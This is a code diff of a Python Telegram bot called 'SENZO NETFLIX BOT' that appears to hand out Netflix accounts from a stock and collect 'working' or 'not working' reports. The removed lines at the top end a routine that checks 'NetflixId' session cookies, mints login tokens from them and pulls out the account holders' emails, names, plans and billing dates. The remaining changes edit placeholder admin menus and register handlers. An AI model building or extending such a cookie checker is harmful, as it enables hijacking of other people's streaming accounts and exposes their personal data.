-                if cookies_dict.get("NetflixId"):
-                    nftoken, nftoken_expiry = generate_nftoken_safe(cookies_dict.get("NetflixId"))
-                
-                return {
-                    "valid": True,
-                    "subscribed": is_subscribed,
-                    "email": email,
-                    "name": name,
-                    "country": country,
-                    "plan": plan,
-                    "plan_key": plan_key,
-                    "plan_label": plan_label,
-                    "streams": streams,
-                    "quality": None,
-                    "price": price,
-                    "billing_date": billing,
-                    "member_since": None,
-                    "payment_method": None,
-                    "card_last4": None,
-                    "phone": None,
-                    "extra_member": False,
-                    "membership_status": membership_status,
-                    "email_verified": False,
-                    "profiles": profiles_str,
-                    "user_guid": user_guid,
-                    "nftoken": nftoken,
-                    "nftoken_expiry": nftoken_expiry,
-                }
-                
-            except requests.exceptions.Timeout:
-                if attempt < MAX_RETRIES - 1:
-                    continue
-                return {"valid": False, "error": "Timeout"}
-            except Exception:
-                if attempt < MAX_RETRIES - 1:
-                    continue
-                return {"valid": False, "error": "Error"}
-        
-        return {"valid": False, "error": "Max retries exceeded"}
-        
-    except Exception:
-        return {"valid": False, "error": "Error"}
-
 # ============================================================
-# SIMPLIFIED ADMIN FUNCTIONS (Placeholders - Safe)
+# PLACEHOLDER ADMIN FUNCTIONS
 # ============================================================
 
 async def admin_reports(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        await query.edit_message_text("📋 **Reports section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
-    except Exception:
-        pass
-
-async def admin_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("📩 **Messages section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
+        await query.edit_message_text("📋 Reports section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
 
@@ -1510,7 +1576,7 @@ async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        await query.edit_message_text("👥 **Users section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
+        await query.edit_message_text("👥 Users section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
 
@@ -1518,7 +1584,7 @@ async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        await query.edit_message_text("📢 **Broadcast section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
+        await query.edit_message_text("📢 Broadcast section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
 
@@ -1526,7 +1592,7 @@ async def admin_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        await query.edit_message_text("⚙️ **Channels section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
+        await query.edit_message_text("⚙️ Channels section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
 
@@ -1534,7 +1600,7 @@ async def admin_stock_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        await query.edit_message_text("📊 **Stock Logs section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
+        await query.edit_message_text("📊 Stock Logs section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
 
@@ -1542,26 +1608,25 @@ async def admin_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         query = update.callback_query
         await query.answer()
-        await query.edit_message_text("📈 **Dashboard section**\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
+        await query.edit_message_text("📈 Dashboard section\n\nComing soon...\n\n👨‍💻 **Developer:** @Senzo268", parse_mode=ParseMode.MARKDOWN)
     except Exception:
         pass
-
-# ============================================================
-# TEXT MESSAGE HANDLER
-# ============================================================
 
 async def handle_text_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         user_id = update.effective_user.id
-        text = update.message.text.strip()
         
         if context.user_data.get("waiting_for_message"):
-            await safe_send_message(user_id, "✅ **Message sent to admin!**\n\nYou will receive a reply here when admin responds.\n\n👨‍💻 **Developer:** @Senzo268", context=context)
+            await update.message.reply_text(
+                "✅ **Message sent to admin!**\n\n"
+                "You will receive a reply here.\n\n"
+                "👨‍💻 **Developer:** @Senzo268",
+                parse_mode=ParseMode.MARKDOWN
+            )
             context.user_data["waiting_for_message"] = False
             return
         
         await start(update, context)
-        
     except Exception:
         pass
 
@@ -1573,17 +1638,16 @@ def main():
     print("=" * 70)
     print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION")
     print("=" * 70)
-    print(f"📊 Database: {'Turso' if db.use_turso else 'SQLite'}")
+    print(f"📊 Database: {'Turso (PERSISTENT)' if db.use_turso else 'SQLite (LOCAL)'}")
     print(f"👤 Admins: {ADMIN_IDS}")
+    print(f"📢 Channel: {REPORT_CHANNEL_ID if REPORT_CHANNEL_ID else 'NOT SET'}")
     print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
-    print(f"📦 Max Accounts: {MAX_ACCOUNTS_PER_USER}")
     print("=" * 70)
     
     if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        print("❌ BOT_TOKEN not set! Please set BOT_TOKEN in .env file")
+        print("❌ BOT_TOKEN not set!")
         return
     
-    # Build application
     application = Application.builder().token(BOT_TOKEN).build()
     
     # Commands
@@ -1591,7 +1655,6 @@ def main():
     application.add_handler(CommandHandler("help", start))
     
     # Callbacks
-    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
     application.add_handler(CallbackQueryHandler(get_account, pattern="^get_account$"))
     application.add_handler(CallbackQueryHandler(working_callback, pattern="^working$"))
     application.add_handler(CallbackQueryHandler(notworking_callback, pattern="^notworking$"))
@@ -1603,12 +1666,14 @@ def main():
     application.add_handler(CallbackQueryHandler(admin_panel, pattern="^admin_panel$"))
     application.add_handler(CallbackQueryHandler(admin_upload, pattern="^admin_upload$"))
     application.add_handler(CallbackQueryHandler(admin_reports, pattern="^admin_reports$"))
-    application.add_handler(CallbackQueryHandler(admin_messages, pattern="^admin_messages$"))
     application.add_handler(CallbackQueryHandler(admin_users, pattern="^admin_users$"))
     application.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
     application.add_handler(CallbackQueryHandler(admin_channels, pattern="^admin_channels$"))
     application.add_handler(CallbackQueryHandler(admin_stock_logs, pattern="^admin_stock_logs$"))
     application.add_handler(CallbackQueryHandler(admin_dashboard, pattern="^admin_dashboard$"))
+    
+    # Channel confirm callback
+    application.add_handler(CallbackQueryHandler(confirm_working_callback, pattern="^confirm_"))
     
     # Message handlers
     application.add_handler(MessageHandler(filters.PHOTO, handle_screenshot))
